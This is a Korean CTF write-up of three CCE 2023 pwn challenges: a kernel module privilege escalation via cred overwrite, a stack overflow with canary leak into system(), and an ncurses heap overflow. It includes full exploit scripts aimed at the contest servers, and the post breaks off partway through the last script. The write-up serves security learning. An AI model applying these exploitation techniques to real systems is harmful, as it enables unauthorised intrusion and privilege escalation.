---
title: "CCE 2023 Quals"
# description: "CCE 2023 Quals"
dateString: June 2023
draft: false
tags: ["CCE 2023 Junior Quals","CCE 2023"]
weight: 30
date: 2023-06-10
# cover:
    # image: ""
---
# K-Exploit
처음으로 잡아본 커널 문제다.
대회끝나고 50분뒤에 플래그가 나왔다.
아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;

## Analysis
rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.

### local_run.sh
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel bzImage \
    -initrd rootfs.img.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1" \
    -s
```
kaslr, kpti, smep, smap 다 빡세게 걸려있다.
### server_run.sh
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel bzImage \
    -initrd $1 \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```
똑같은데 디버깅 옵션만 빠진거같다.

### k-exploit.ko
```c
  _fentry__(flip, cmd);
  copy_from_user(index, usr_, 0x20LL);
  if ( (_DWORD)cmd == 0x10002 )                 // modify
  {
    idx = 2 * *(_DWORD *)index;
    if ( (unsigned int)(2 * *(_DWORD *)index) > 0x28 )
      _ubsan_handle_out_of_bounds(&off_BA0, idx);
    v11 = arr[idx];
    if ( !v11 )
      return -1LL;
    cnt = sz;
    if ( sz > (unsigned __int64)arr[idx + 1] )
      return -1LL;
    from_ = src;
    to_ = v11 + 8 * off;
    if ( (unsigned __int64)sz > 0x7FFFFFFF )
      BUG();
    goto LABEL_26;                              // copy_from_user(to_, from_, cnt);
  }
```
ioctl로 modify 할 수 있다.
구조체를 userland에서 받아서 그걸 바탕으로 처리를 진행한다.

```c
  if ( (unsigned int)cmd > 0x10002 )
  {
    if ( (_DWORD)cmd == 0x10003 )               // CREATE
    {
      v15 = 2 * *(_DWORD *)index;
      if ( (unsigned int)(2 * *(_DWORD *)index) > 0x28 )
        _ubsan_handle_out_of_bounds(&off_B80, v15);
      v6 = arr[v15];
      if ( v6 )
      {
        return -1LL;
      }
      else if ( (unsigned __int64)sz > 0xA0 )
      {
        return -1LL;
      }
      else
      {
        to = _kmalloc(sz, 0x6000C0LL);
        if ( to )
        {
          arr[v15] = to;
          if ( (unsigned __int64)sz > 0x7FFFFFFF )
            BUG();
          copy_from_user(to, src, sz);
          arr[v15 + 1] = sz;
        }
        else
        {
          return -1LL;
        }
      }
    }
```
kmalloc을 한다.
```c
   else if ( (_DWORD)cmd == 0x10004 )          // DELETE
    {
      v4 = 2 * *(_DWORD *)index;
      if ( (unsigned int)(2 * *(_DWORD *)index) > 0x28 )
        _ubsan_handle_out_of_bounds(&off_B60, v4);
      v5 = arr[v4];
      if ( v5 )
      {
        kfree(v5);
        arr[v4] = 0LL;
        return 0LL;
      }
      else
      {
        return -1LL;
      }
    }
    else
    {
      return 0LL;
    }
    return v6;
  }
```
얘는 kfree하는데 사용한다.

```c
  if ( (_DWORD)cmd != 0x1337 )
  {
    if ( (_DWORD)cmd != 0x10001 )
      return 0LL;
    v8 = 2 * *(_DWORD *)index;
    if ( (unsigned int)(2 * *(_DWORD *)index) > 0x28 )
      _ubsan_handle_out_of_bounds(&off_BC0, v8);
    usr = arr[v8];
    if ( !usr )
      return -1LL;
    if ( sz > (unsigned __int64)arr[v8 + 1] )
      return -1LL;
    if ( (unsigned __int64)sz > 0x7FFFFFFF )
      BUG();
    copy_to_user(src, usr + 8 * off);
    return 0LL;
  }
  v17 = 2 * *(_DWORD *)index;
  if ( (unsigned int)(2 * *(_DWORD *)index) > 0x27 )
    _ubsan_handle_out_of_bounds(&off_B40, v17);
  v6 = arr[v17];
  if ( v6 )
  {
    cnt = sz;
    from_ = src;
    to_ = *(_QWORD *)(v6 + 8 * off);
    if ( (unsigned __int64)sz > 0x7FFFFFFF )
      BUG();
LABEL_26:
    copy_from_user(to_, from_, cnt);
```
0x1337은 포인터 참조 두번하고 userland의 데이터로 덮는다.
0x1001은 메모리를 읽어주고 userland로 돌려준다.
```python
import hashlib
import base64
from pwn import *

REMOTE_IP = "20.196.194.8"
REMOTE_PORT = 1234

EXPLOIT_URL = b"??"

io = remote(REMOTE_IP, REMOTE_PORT)

def solvepow(x, target):
    x = bytes.fromhex(x)
    target = bytes.fromhex(target)
    for i in range(256**3):
        if hashlib.md5(x + i.to_bytes(3, "big")).digest() == target:
            return x.hex()+hex(i)[2:]

def main():
    line = io.recvuntil(b"\n")
    x = line.split(b"= ")[1][:26].decode("utf-8")
    target = line.split(b"= ")[2][:32].decode("utf-8")
    io.recvuntil(b": ")
    io.sendline(bytes(solvepow(x, target), "utf-8"))
    io.recvuntil(b"link\n")
    io.sendline(b"1")
    io.recvuntil(b": ")
    f = open("./a.out", "rb")
    data = base64.b64encode(f.read())
    f.close()
    io.sendline(data)
    # io.sendline(EXPLOIT_URL)
    io.interactive()
    return

if __name__ == '__main__':
    main()
```
이거 때문에 브포하기 힘들다.
## Exploitation
```
~ # cat /proc/slabinfo | grep cred
cred_jar             105    105    192   21    1 : tunables    0    0    0 : slabdata      5      5      0  
```
slab info 확인해서 cred 크기 확인해보면, 0xc0이라서 잘 맞추고 스프레이하고 인접한 cred를 덮으려고 했는데 막혀있다.
UAF도 불가능하다.
```c
    if ( sz > (unsigned __int64)arr[idx + 1] )
      return -1LL;
    from_ = src;
    to_ = v11 + 8 * off;
    if ( (unsigned __int64)sz > 0x7FFFFFFF )
      BUG();
    goto LABEL_26;                              // copy_from_user(to_, from_, cnt);
```
```c
    if ( sz > (unsigned __int64)arr[v8 + 1] )
      return -1LL;
    if ( (unsigned __int64)sz > 0x7FFFFFFF )
      BUG();
    copy_to_user(src, usr + 8 * off);
    return 0LL;
```
off 검증이 없다.
원래 0x1337이나 0x1001도 있는데 어떤 곳에 사용해야할지 잘 모르겠고 시간도 부족해서, 간단하게 fork로 cred 구조체 heap spraying 하고 브포했다.
생각보다 엔트로피가 그렇게 크지 않아보여서 시도해봤는데, 막상 remote로 보낼때 pow_client.py 때문에 브포하기 힘들었다.

```c
	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;

#ifdef CONFIG_KEYS
	/* Cached requested key. */
	struct key			*cached_requested_key;
#endif

	/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */
	char				comm[TASK_COMM_LEN];
```
출제자분의 라이트업에서는 task_struct를 찾기 위해서 prctl PR_SET_NAME으로 이름을 바꿔주고 0x1001로 메모리를 읽으면서 그 문자열 위치를 탐색하고 문자열 위치 - 0x10 위치에 cred 구조체 포인터가 있으니까 0x1337로 참조해서 익스했다.

### Exploit script
```python
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <sys/wait.h>

struct ioctl_info {
    uint32_t idx;
    uint32_t dummy;
    uint64_t src;
    uint64_t sz;
    uint64_t off;
}__attribute__((packed));

#define CREATE 0x10003
#define MODIFY 0x10002
#define DELETE 0x10004

int main()
{
    int fd;
    struct ioctl_info io;
    if ((fd = open("/dev/K-exploit", O_RDWR)) < 0){
        puts("ERR");
        exit(1);
    }
    io.idx = 0;
    char * buf = malloc(0xc0);
    strcpy(buf, "DEADBEEF0");
    io.src = (int64_t)buf;
    io.sz = 0xa0; // cred

    if ((int)ioctl(fd, CREATE, &io) < 0){
        io.idx =0;
        ioctl(fd, DELETE, &io);
        if ((int)ioctl(fd, CREATE, &io) < 0){
            puts("ERR");
        }
    }
    char * flag = malloc(0x40);
    int fl = 0;
    int pid[0x100];
    for(int i =0;i<0x100;i++){
        pid[i] = fork();
        if (pid[i] == 0){
            sleep(3);
            if (getuid() == 0){
                fl = 0;
                puts("priv escalated");
                int f = open("/flag",O_RDONLY);
                printf("%d",f);
                read(f, flag,0x40);
                puts(flag);
            }
            exit(0);
        }
        else if (pid[i] == -1){
            puts("fork error");
        }
    }

    memcpy(buf,"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",40);
    int v;
    for (int i=0;i< 30;i++){
        io.off = (0xac480-0xc0*10)/0x8 + i;
        io.sz = 40;
        if ((int)ioctl(fd, MODIFY, &io) < 0){
            puts("ERR");
            exit(1);
        }
        puts("trying");
    }
    int status;
    wait(&status);
    close(fd);
    if(fl == 0){
        puts("NOPE");
    }
    return 0;
}
```
![](/blog/CCE_2023_Junior_Quals/image.png)
`cce2023{y0u_kn0w_Linux_k3rn3l_3xploit?}`


# n0t_rand0m
## Analysis
```c
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("what your name?");
  read(0, buf, 8uLL);
  printf("Hello %s", buf);
  puts("write comment");
  read(0, comment, 0x18uLL);
  v3 = time(0LL);
  srand(v3);
  while ( 1 )
  {
    while ( 1 )
    {
      nbytes_4 = rand() % 9 + 1;
      printf("random number : %d\n", nbytes_4);
      printf("continue? (yes or no) ");
      read(0, haystack, 8uLL);
      if ( strstr(haystack, "no") )
        break;
      if ( !strstr(haystack, "yes") )
        exit(1);
    }
    switch ( nbytes_4 )
    {
      case 1u:
        printf("comment : %s\n", comment);
        continue;
      case 2u:
        printf("name : %s\n", buf);
        continue;
      case 3u:
        puts("write new comment");
        read(0, comment, nbytes);
        continue;
      case 4u:
        puts("write new name");
        read(0, buf, nbytes);
        continue;
      case 5u:
        nbytes = strlen(comment);
        printf("%d\n", nbytes);
        continue;
      case 6u:
        nbytes = strlen(buf);
        printf("%d\n", nbytes);
        continue;
      case 7u:
        sub_401296(nbytes);
        goto LABEL_15;
      case 8u:
        sub_401345(nbytes);
        goto LABEL_15;
      case 9u:
LABEL_15:
        exit(1);
      case 0xAu:
        sub_4013B1(buf);
        break;
      default:
        continue;
    }
  }
}
```
```c
unsigned __int64 __fastcall sub_401296(unsigned int a1)
{
  char buf[8]; // [rsp+18h] [rbp-28h] BYREF
  char v3[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("one more time what your name");
  read(0, buf, a1);
  printf("ok %s\n", buf);
  puts("did you have fun?");
  read(0, v3, a1);
  puts("ok...bye");
  return v4 - __readfsqword(0x28u);
}
```
```c
int __fastcall sub_4013B1(const char *a1)
{
  return system(a1);
}
```
일반적으로는 %9 + 1 때문에 0xa에는 접근할 수 없다.

## Exploitation
```c
  char buf[8]; // [rsp+8h] [rbp-28h] BYREF
  char comment[24]; // [rsp+10h] [rbp-20h] BYREF
```
comment와 buf가 인접해있다.
```c
      case 5u:
        nbytes = strlen(comment);
        printf("%d\n", nbytes);
        continue;
      case 6u:
        nbytes = strlen(buf);
        printf("%d\n", nbytes);
```
nbytes를 strlen으로 늘릴 수 있다.
인접해있기에 strlen(buf)로 늘려주면 nbytes를 늘릴 수 있다.

sub_401296타고 들어가서 canary leak하고 ret를 system 쪽으로 뛰면 된다.
### Exploit script
```python
from pwn import *
from ctypes import CDLL
e = ELF('./n0t_rand0m')
libc = ELF("./libc.so.6")
#p = process('./n0t_rand0m',env={"LD_PRELOAD":"./libc.so.6"})
p = remote("20.196.192.95",8888)
context.log_level='debug'

def func(n):
    while True:
        rvu(b'random number : ')
        r = int(rvl()[:-1])
        if r == n:
            sa(b'continue? (yes or no)',b'no')
            break
        else:
            sa(b'continue? (yes or no)',b'yes')
sa = lambda x,y : p.sendafter(x,y)
rvu = lambda x : p.recvuntil(x)
rvl = lambda : p.recvline()
sa(b'what your name?',b'A'*8)
rvu(b"A"*8)

# stack = u64(rvu(b"\x7f").ljust(8,b'\x00'))
# success(hex(stack-0x2b1)) # local leak
sa(b'write comment',b'A'*0x18)
func(2)
func(6)
func(3)
sa(b'write new comment',b'A'*0x20)
func(6)
func(3)
sa(b'write new comment',b'A'*0x28)
func(6)
func(1)

rvu(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
l =u64(rvu(b'\x7f').ljust(8,b'\x00')) #remote leak
success(hex(l))

# func(4)
# sa(b'write new name',b'sh\x00')
# func(7)
# sa(b'one more time what your name',b'A'*0x21)
# rvu(b'A'*0x21)
# can = b'\x00'+p.recv(7)
# sa(b'did you have fun?',b'A'*0x18 + can +p64(stack-0x2b1+0x28)+p64(0x04016B0)) 

func(7)
sa(b'one more time what your name',b'A'*0x21)
rvu(b'A'*0x21)
can = b'\x00'+p.recv(7)
sa(b'did you have fun?',b'A'*0x18 + can +p64(l + 0x1ae908 + 0x28)+p64(0x04016B0)) 

p.interactive()
```
로컬에선 릭이 됐는데, 리모트에선 안되길래 그냥 따로 릭을 진행했다.
`cce2023{c306445363ca0d34c2fd4ba6e2da5ea19052ae855d00b3b46bc71785d16db14542d944d41934e2bcdab0816a154a8872b1258334cbc2f2672004db5a}`

# Fit
이건 대회끝나고 보니까 솔버나왔길래 궁금해서 풀어봤다.
## Analysis
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // eax

  v3 = time(0LL);
  srand(v3);
  initscr();
  raw();
  curs_set(1);
  resizeterm(25, 80);
  cbreak();
  keypad(stdscr, 1);
  noecho();
  go();
  endwin();
  echo();
  return 0LL;
}
```
ncurses 냄새가 난다.

```c
  v11 = __readfsqword(0x28u);
  clock_gettime(1, &tp);
  clock_gettime(1, &v6);
  memset(rand_char, 0, sizeof(rand_char));
  v8 = 0;
  memset(input_, 0, sizeof(input_));
  v10 = 0;
  stage_ = 1;
  v3 = 0;
  get_rand_char_20(rand_char);
  render_screen(1u, 0, rand_char, (const char *)input_);
  while ( 1 )
  {
    do
    {
      while ( 1 )
      {
        while ( 1 )
        {
          v4 = wgetch(stdscr);
          if ( v4 == -1 )
            goto LABEL_18;
          if ( (v4 <= '@' || v4 > 'a') && (v4 <= '`' || v4 > 'z') && (v4 <= '/' || v4 > '9') )
            break;
          if ( v3 <= 19 )
            *((_BYTE *)input_ + v3++) = v4;
        }
        if ( v4 != 0x107 )
          break;
        if ( v3 > 0 )
          --v3;
        *((_BYTE *)input_ + v3) = 0;
        wclear(qword_5250);
      }
    }
    while ( v4 != 0x157 && v4 != '\n' );        // get_by_line
LABEL_18:
    if ( v4 == 343 || v4 == 10 )
      break;
LABEL_24:
    get_time(&v6);
    render_screen(stage_, LODWORD(v6.tv_sec) - LODWORD(tp.tv_sec), rand_char, (const char *)input_);
  }
  if ( memcmp(input_, rand_char, 20uLL) )       // not correct -> go input again
  {
LABEL_23:
    wclear(qword_5250);
    memset(input_, 0, 20uLL);
    v3 = 0;
    goto LABEL_24;
  }
  if ( ++stage_ != 6 )
  {
    get_rand_char_20(rand_char);
    goto LABEL_23;
  }
  clock_gettime(1, &v6);
  *game_struct = v6.tv_sec - tp.tv_sec;         // time
  if ( v6.tv_nsec >= tp.tv_nsec )
  {
    game_struct[1] = v6.tv_nsec - tp.tv_nsec;
  }
  else
  {
    --*game_struct;
    game_struct[1] = v6.tv_nsec + 1000000000 - tp.tv_nsec;
  }
  return v11 - __readfsqword(0x28u);
}
```
랜덤으로 문자열 뽑아서 입력된 문자열과 비교한다.

```c
_BOOL8 __fastcall retry_(__int64 *game_struct)
{
  int i; // [rsp+10h] [rbp-10h]
  int v3; // [rsp+14h] [rbp-Ch]
  _QWORD *v4; // [rsp+18h] [rbp-8h]

  register_game_result(game_struct);            // heap leak next node pointer leak vulnerabililty
  wclear(stdscr);
  wborder(
    stdscr,
    (unsigned int)dword_5200,
    (unsigned int)dword_5200,
    (unsigned int)dword_51E4,
    (unsigned int)dword_51E4,
    0LL,
    0LL,
    0LL,
    0LL);
  wmove(stdscr, 2, 38);
  printw("Record");
  v4 = (_QWORD *)start_res_block[5];
  for ( i = 0; i <= 4; ++i )
  {
    wmove(stdscr, 3 * i + 5, 7);
    printw("%d.", (unsigned int)(i + 1));
    if ( v4 )                                   // block + 0x28 -> 0
    {
      wmove(stdscr, 3 * i + 5, 11);
      printw("%s", (const char *)v4 + 0x10);    // heap leak vuln trigger 
      wmove(stdscr, 3 * i + 5, 52);
      printw("%ld.%ld", *v4, v4[1]);
      v4 = (_QWORD *)v4[5];                     // AAR ? next pointer can be overflowed 
    }
  }
  wmove(stdscr, 20, 34);
  echo();
  printw("Retry(y/N)?");
  v3 = wgetch(stdscr);
  noecho();
  return v3 != 'y';
}
```
한판 끝나고 결과 저장해주고, 더 할건지 묻는다.
```c
      0LL);
    wmove(stdscr, 5, 37);
    printw("Result");
    wmove(stdscr, 9, 30);
    printw("Passed Time: %ld.%ld", *game_struct, game_struct[1]);
    wmove(stdscr, 13, 20);
    printw("Name: ");
    wrefresh(stdscr);
    echo();
    game_res_struct_malloc = (__int64 *)malloc(0x30uLL);
    *game_res_struct_malloc = *game_struct;
    game_res_struct_malloc[1] = game_struct[1];
    game_res_struct_malloc[5] = 0LL;
    read(0, game_res_struct_malloc + 2, 0x20uLL);
    noecho();
    if ( current_res_block )
      current_res_block[5] = (__int64)game_res_struct_malloc;
    else
      start_res_block[5] = game_res_struct_malloc;
    result = (unsigned __int64)game_res_struct_malloc;
    current_res_block = game_res_struct_malloc;
  }
  return result;
}
```
이름을 기록한다.
singly linked list로 저장한다.
```c
  wmove(stdscr, 13, 20);
  printw("Name index: ");
  wrefresh(stdscr);
  echo();
  scanw("%d", &idx);
  wclear(stdscr);
  wborder(
    stdscr,
    (unsigned int)dword_5200,
    (unsigned int)dword_5200,
    (unsigned int)dword_51E4,
    (unsigned int)dword_51E4,
    0LL,
    0LL,
    0LL,
    0LL);
  noecho();
  wmove(stdscr, 13, 20);
  printw("Name: ");	
  wrefresh(stdscr);
  echo();
  v3 = read(0, NAME, 0x14uLL);
  NAME[v3 - 1] = 0;
  noecho();
  for ( i = 0; i < idx; ++i )
  {
    if ( !v4 )
      return v7 - __readfsqword(0x28u);
    v5 = v4;
    v4 = (__int64 *)v4[5];                      // next ptr
  }
  if ( v4 )                                     // if exists
  {
    memcpy(v4 + 2, NAME, 0x14uLL);              // name rewriting? AAW trigger?
    puts((const char *)v5 + 0x10);              // print_name? 
  }
  return v7 - __readfsqword(0x28u);
}
```
게임 끝나고 'y'가 아니라면 실행되는 함수다.
idx 받고 이름 다시 써준다.

## Exploitation
취약점은 대놓고 주는데, 익스가 오래걸렸다.
I/O가 이상해서 pyte 터미널 에뮬레이터를 활용했다.
```c
    game_res_struct_malloc = (__int64 *)malloc(0x30uLL);
    *game_res_struct_malloc = *game_struct;
    game_res_struct_malloc[1] = game_struct[1];
    game_res_struct_malloc[5] = 0LL;
    read(0, game_res_struct_malloc + 2, 0x20uLL);
```
경계 체크가 미흡해서 다음 노드를 가리키는 포인터를 덮을 수 있다.
```c
    echo();
    game_res_struct_malloc = (__int64 *)malloc(0x30uLL);
    *game_res_struct_malloc = *game_struct;
```
초기화가 하지 않아서 UAF를 트리거할 수 있다. 
```c
  wmove(stdscr, 2, 38);
  printw("Record");
  v4 = (_QWORD *)start_res_block[5];
  for ( i = 0; i <= 4; ++i )
  {
    wmove(stdscr, 3 * i + 5, 7);
    printw("%d.", (unsigned int)(i + 1));
    if ( v4 )                                   // block + 0x28 -> 0
    {
      wmove(stdscr, 3 * i + 5, 11);
      printw("%s", (const char *)v4 + 0x10);    // heap leak vuln trigger 
      wmove(stdscr, 3 * i + 5, 52);
      printw("%ld.%ld", *v4, v4[1]);
      v4 = (_QWORD *)v4[5];                     // AAR ? next pointer can be overflowed 
    }
  }
  wmove(stdscr, 20, 34);
```
출력해줘서 여기서 릭하면 된다.
```c
__int64 printw(__int64 a1, ...)
{
  __va_list_tag va[1]; // [rsp+0h] [rbp-D8h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-C0h]

  va_start(va, a1);
  v3 = __readfsqword(0x28u);
  return vw_printw((__int64)stdscr, a1, (__int64)va);
}
```
```c
__int64 __fastcall vw_printw(__int16 *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  unsigned __int8 *v5; // rax

  v4 = _nc_screen_of(a1);
  v5 = (unsigned __int8 *)sub_189A0(v4, a2, a3);
  if ( v5 )
    return waddnstr(a1, v5, -1);
  else
    return 0xFFFFFFFFLL;
}
```
```c
      goto LABEL_54;
    return v23;
  }
  v51 = string;
  v6 = v5 + (_DWORD)string + 1;
  while ( 1 )
  {
    ++v51;
    v7 = _nc_screen_of(a1);
    v8 = (unsigned __int8 *)unctrl_sp(v7, v3);
    if ( !v8[1] || (v9 = __ctype_b_loc(), ((*v9)[v3] & 0x4002) == 0x4000) )
    {
      v25 = *((_DWORD *)a1 + 4);
      v26 = a1[1];
      v27 = *((_DWORD *)a1 + 5);
      v28 = a1[1];
      v29 = BYTE1(v25);
```
```c
char *__fastcall unctrl_sp(__int64 a1, unsigned __int8 a2)
{
  int v2; // eax
  int v3; // eax
  __int64 v5; // rax
  const unsigned __int16 **v6; // r8

  if ( a1 )
  {
    v2 = *(_DWORD *)(a1 + 1496);
    if ( v2 > 1 )
    {
      v3 = a2 - 128;
      if ( (unsigned int)v3 <= 0x1F || (unsigned int)a2 - 160 <= 0x5F )
        return (char *)&unk_293A0 + word_297C0[v3];
      goto LABEL_7;
    }
    if ( (unsigned int)a2 - 160 <= 0x5F )
    {
      if ( v2 != 1 )
      {
        if ( v2 )
          goto LABEL_7;
        v6 = __ctype_b_loc();
        v5 = a2;
        if ( ((*v6)[a2] & 0x4000) == 0 )
          return (char *)&unk_293A0 + *((__int16 *)&off_291A0 + v5);
      }
      v3 = a2 - 128;
      return (char *)&unk_293A0 + word_297C0[v3];
    }
  }
LABEL_7:
  v5 = a2;
  return (char *)&unk_293A0 + *((__int16 *)&off_291A0 + v5);
}
```

특정 범위에 안걸리면 릭이 제대로 되서 간단하게 제대로 된 주소 나올때까지 반복적으로 시도하면 바로 익스할 수 있었지만, printw의 출력 로직을 분석해서 한번에 익스플로잇되도록 만들었다.
겹치는 부분이 생겨서 가짓수가 꽤 나오기 때문에 백트레킹해서 주소가 제대로 나왔는지 확인했다.

이후 AAW로 잘 덮고, 마저 익스했다.
### Exploit script
```python
from pwn import * 
import pyte

DEBUG = True

context.terminal=['tmux', 'splitw', '-h']
context.binary = e = ELF('./fit')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
off = [0x2000, 0x25D0] # 0x2000, 0x0002346
script = ''
for i in off:
    script += f'brva {hex(i)}\n'

if DEBUG:
    p = gdb.debug(e.path, gdbscript=script)
else :
    p = process(e.path)
dims = (80, 25)
screen = pyte.Screen(*dims)
stream = pyte.ByteStream(screen)
sl = lambda x : p.sendline(x)
s = lambda x : p.send(x)

def feed_stream() -> str:
    global stream,screen
    stream.feed(p.recv(2000))
    scr = ''
    for i in screen.display:
        scr += str(i) + '\n'
    return scr

def rvuntil(b : bytes) -> bytes:
    for i in range(20):
        rv = p.recv(2000,timeout=1)
        sleep(0.01)
        if b in rv:
            break
    return rv

def solve(st) -> int:
    scr = feed_stream().split()
    try:
        ans = (scr[scr.index('Word:')+2])
        stage = int(scr[scr.index('Stage')+1])
        sl(ans)
        if stage != st:
            return solve(st)
    except:
        return solve(st)

    return stage
ctype_loc = [0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x0002,0x2003,  0x2002,0x2002, 0x2002, 0x2002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002, 0x0002, 0x0002, 0x0002,0x0002,0x0002,0x0002,0x0002,0x6001, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xd808, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xc004, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xd508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc508, 0xc004, 0xc004,0xc004, 0xc004, 0xc004, 0xc004, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xd608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc608, 0xc004, 0xc004, 0xc004, 0xc004, 0x0002,0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000,0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000,0x0000,0x0000,0x0000,0x0000,0x0028,0x0000,0x0043,0x0000,  0x0029,0x0000, 0x0000, 0x0000,0x0000, 0x0000, 0x003c, 0x0000,0x003c,0x0000, 0x0000,0x0000,0x0000,0x0000, 0x002d, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,0x0028,0x0000,0x0052, 0x0000, 0x0029, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0075, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x002c, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x003e, 0x0000, 0x003e, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0031, 0x0000, 0x002f, 0x0000, 0x0032, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0020, 0x0000, 0x0033, 0x0000, 0x002f, 0x0000, 0x0034, 0x0000, 0x0020, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0041, 0x0000, 0x0045, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0078, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0073, 0x0000, 0x0073, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0061, 0x0000, 0x0065, 0x0000, ]
def unctrl_sp_emu(x):
    global ctype_loc
    word_29780 = [0, 3, 2, 3, 4, 3, 6, 3, 8, 3, 10, 3, 12, 3, 14, 3, 16, 3, 18, 3, 20, 3, 22, 3, 24, 3, 26, 3, 28, 3, 30, 3, 32, 3, 34, 3, 36, 3, 38, 3, 40, 3, 42, 3, 44, 3, 46, 3, 48, 3, 50, 3, 52, 3, 54, 3, 56, 3, 58, 3, 60, 3, 62, 3, 64, 3, 66, 3, 68, 3, 70, 3, 72, 3, 74, 3, 76, 3, 78, 3, 80, 3, 82, 3, 84, 3, 86, 3, 88, 3, 90, 3, 92, 3, 94, 3, 96, 3, 98, 3, 100, 3, 102, 3, 104, 3, 106, 3, 108, 3, 110, 3, 112, 3, 114, 3, 116, 3, 118, 3, 120, 3, 122, 3, 124, 3, 126, 3, 128, 3, 130, 3, 132, 3, 134, 3, 136, 3, 138, 3, 140, 3, 142, 3, 144, 3, 146, 3, 148, 3, 150, 3, 152, 3, 154, 3, 156, 3, 158, 3, 160, 3, 162, 3, 164, 3, 166, 3, 168, 3, 170, 3, 172, 3, 174, 3, 176, 3, 178, 3, 180, 3, 182, 3, 184, 3, 186, 3, 188, 3, 190, 3, 192, 3, 194, 3, 196, 3, 198, 3, 200, 3, 202, 3, 204, 3, 206, 3, 208, 3, 210, 3, 212, 3, 214, 3, 216, 3, 218, 3, 220, 3, 222, 3, 224, 3, 226, 3, 228, 3, 230, 3, 232, 3, 234, 3, 236, 3, 238, 3, 240, 3, 242, 3, 244, 3, 246, 3, 248, 3, 250, 3, 252, 3, 254, 3]
